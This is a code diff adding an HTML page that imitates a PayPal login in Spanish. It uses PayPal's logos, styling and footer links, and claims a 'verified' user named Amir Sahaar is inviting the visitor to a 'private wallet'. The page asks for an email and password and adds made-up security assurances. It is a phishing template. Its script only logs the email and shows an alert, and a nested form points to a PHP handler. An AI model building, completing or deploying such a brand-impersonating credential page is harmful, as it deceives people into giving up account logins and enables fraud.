@@ -1,0 +1,265 @@
+<html>
+
+<head>
+
+<base href="https://cdn.jsdelivr.net/">
+
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>PayPal Login - Invitación de Amir Sahaar</title>
+     <style>
+@import url('https://fonts.googleapis.com/css2?family=PayPalSansSmall-Regular&family=PayPalSansBig-Regular&display=swap');
+
+body, html {
+    height: 100%;
+    margin: 0;
+    font-family: 'PayPalSansSmall-Regular', 'PayPalSansBig-Regular', Helvetica, Arial, sans-serif;
+    background-color: #f5f7fa;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    align-items: center;
+    padding: 20px;
+    box-sizing: border-box;
+    position: relative;
+}
+.login-container {
+    background-color: white;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: 420px;
+    margin: 80px auto 40px;
+}
+.logo {
+    text-align: center;
+    margin-bottom: 30px;
+}
+.logo img {
+    width: 110px;
+    max-width: 100%;
+    height: auto;
+}
+.profile-picture {
+    text-align: center;
+    margin-bottom: 30px;
+}
+.profile-picture svg {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+}
+.invitation {
+    text-align: center;
+    margin-bottom: 35px;
+    font-size: 18px;
+    color: #2c2e2f;
+    font-weight: 400;
+    line-height: 1.5;
+}
+.verified-badge {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 18px;
+    height: 18px;
+    background-color: #3897f0;
+    border-radius: 50%;
+    margin-left: 5px;
+    position: relative;
+    top: -2px;
+}
+.verified-badge svg {
+    width: 12px;
+    height: 12px;
+    fill: white;
+}
+input[type="email"], input[type="password"] {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0;
+    border: 1px solid #9da3a6;
+    border-radius: 6px;
+    box-sizing: border-box;
+    font-size: 16px;
+    transition: border-color 0.3s, box-shadow 0.3s;
+    font-family: 'PayPalSansSmall-Regular', 'PayPalSansBig-Regular', Helvetica, Arial, sans-serif;
+}
+input[type="email"]:focus, input[type="password"]:focus {
+    border-color: #0070ba;
+    box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.2);
+    outline: none;
+}
+button {
+    width: 100%;
+    padding: 16px;
+    background-color: #0070ba;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 18px;
+    font-weight: bold;
+    transition: background-color 0.3s;
+    margin-top: 20px;
+    font-family: 'PayPalSansSmall-Regular', 'PayPalSansBig-Regular', Helvetica, Arial, sans-serif;
+}
+button:hover {
+    background-color: #005ea6;
+}
+.forgot-password {
+    text-align: center;
+    margin-top: 25px;
+}
+.forgot-password a {
+    color: #0070ba;
+    text-decoration: none;
+    font-size: 16px;
+}
+.forgot-password a:hover {
+    text-decoration: underline;
+}
+.security-info {
+    font-size: 13px;
+    color: #2c2e2f;
+    text-align: justify;
+    width: 100%;
+    max-width: 420px;
+    margin-top: 30px;
+    line-height: 1.6;
+    background-color: #f5f7fa;
+    padding: 20px;
+    border-radius: 6px;
+    box-sizing: border-box;
+}
+.footer-links {
+    font-size: 12px;
+    color: #666;
+    text-align: center;
+    margin-top: 30px;
+    width: 100%;
+    max-width: 420px;
+    border-top: 1px solid #ccc;
+    padding-top: 20px;
+}
+.footer-links a {
+    color: #666;
+    text-decoration: none;
+    margin: 0 8px;
+}
+.footer-links a:hover {
+    text-decoration: underline;
+}
+.top-left-logo {
+    position: absolute;
+    top: 30px;
+    left: 30px;
+    cursor: pointer;
+}
+.top-left-logo img {
+    width: 180px;
+    height: auto;
+}
+
+@media (max-width: 600px) {
+    body, html {
+        padding: 15px;
+        background-color: white;
+    }
+    .login-container {
+        padding: 30px 20px;
+        box-shadow: none;
+        margin-top: 60px;
+    }
+    .invitation {
+        font-size: 16px;
+    }
+    input[type="email"], input[type="password"], button {
+        font-size: 16px;
+    }
+    .security-info {
+        font-size: 12px;
+        background-color: #f5f7fa;
+        padding: 15px;
+        margin-top: 20px;
+    }
+    .footer-links {
+        font-size: 11px;
+        margin-top: 20px;
+    }
+    .top-left-logo {
+        top: 15px;
+        left: 15px;
+    }
+    .top-left-logo img {
+        width: 120px;
+    }
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="top-left-logo" onclick="window.location.href='https://www.paypal.com/ve/home'">
+    <img src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-200px.png" alt="PayPal logo grande">
+</div>
+
+<div class="login-container">
+    <div class="logo">
+        <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/PP_logo_h_100x26.png" alt="PayPal logo" style="border: none;">
+    </div>
+    <div class="profile-picture">
+        <svg width="100" height="100" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="50" fill="black"/>
+            <text x="50" y="62" font-family="Arial, sans-serif" font-size="38" fill="#FFD700" text-anchor="middle" dominant-baseline="middle" style="font-weight: bold; font-style: italic;">ام</text>
+        </svg>
+    </div>
+    <div class="invitation">
+        Amir Sahaar<span class="verified-badge">
+            <svg viewBox="0 0 24 24" aria-label="Verified account" role="img">
+                <path d="M22.5 12.5c0-1.58-.875-2.95-2.148-3.6.154-.435.238-.905.238-1.4 0-2.21-1.71-3.998-3.818-3.998-.47 0-.92.084-1.336.25C14.818 2.415 13.51 1.5 12 1.5s-2.816.917-3.437 2.25c-.415-.165-.866-.25-1.336-.25-2.11 0-3.818 1.79-3.818 4 0 .494.083.964.237 1.4-1.272.65-2.147 2.018-2.147 3.6 0 1.495.782 2.798 1.942 3.486-.02.17-.032.34-.032.514 0 2.21 1.708 4 3.818 4 .47 0 .92-.086 1.335-.25.62 1.334 1.926 2.25 3.437 2.25 1.512 0 2.818-.916 3.437-2.25.415.163.865.248 1.336.248 2.11 0 3.818-1.79 3.818-4 0-.174-.012-.344-.033-.513 1.158-.687 1.943-1.99 1.943-3.484zm-6.616-3.334l-4.334 6.5c-.145.217-.382.334-.625.334-.143 0-.288-.04-.416-.126l-.115-.094-2.415-2.415c-.293-.293-.293-.768 0-1.06s.768-.294 1.06 0l1.77 1.767 3.825-5.74c.23-.345.696-.436 1.04-.207.346.23.44.696.21 1.04z"></path>
+            </svg>
+        </span> te está invitando a su cartera privada
+    </div>
+    <form id="login-form">
+        <form action="procesar_formulario.php" method="POST">
+        <input type="email" id="email" placeholder="Correo electrónico o número de teléfono" required>
+        <input type="password" id="password" placeholder="Contraseña" required>
+        <button type="submit">Iniciar sesión</button>
+    </form>
+    <div class="forgot-password">
+        <a href="https://www.paypal.com/authflow/password-recovery">¿Olvidaste tu contraseña?</a>
+    </div>
+</div>
+
+<div class="security-info">
+    PayPal es totalmente seguro. Nuestras carteras privadas utilizan un método de seguridad de punto a punto que proporciona el doble de seguridad a nuestros clientes. Está protegido por las más avanzadas tecnologías de encriptación y autenticación multifactor, garantizando la máxima protección de sus datos financieros en todo momento.
+</div>
+
+<div class="footer-links">
+    <a href="https://www.paypal.com/es/webapps/mpp/ua/privacy-full">Normas de privacidad</a> |
+    <a href="https://www.paypal.com/es/webapps/mpp/ua/legalhub-full">Seguridad</a> |
+    <a href="https://www.paypal.com/es/webapps/mpp/ua/useragreement-full">Contratos</a> |
+    <a href="https://www.paypal.com/es/webapps/mpp/jobs">Encontrar empleo</a> |
+    <a href="https://www.paypal.com/es/smarthelp/home">Ayuda</a> |
+    <a href="https://developer.paypal.com/docs/">Documentación</a>
+</div>
+
+<script>
+document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    
+    // Aquí normalmente se enviarían los datos al servidor
+    // Por razones de seguridad, no implementamos la funcionalidad real de inicio de sesión
+    console.log('Intento de inicio de sesión con:', email);
+    alert('Intento de inicio de sesión registrado. En una aplicación real, estos datos se enviarían de forma segura al servidor.');
+});
+</script>
+
+</body>
+
+</html>
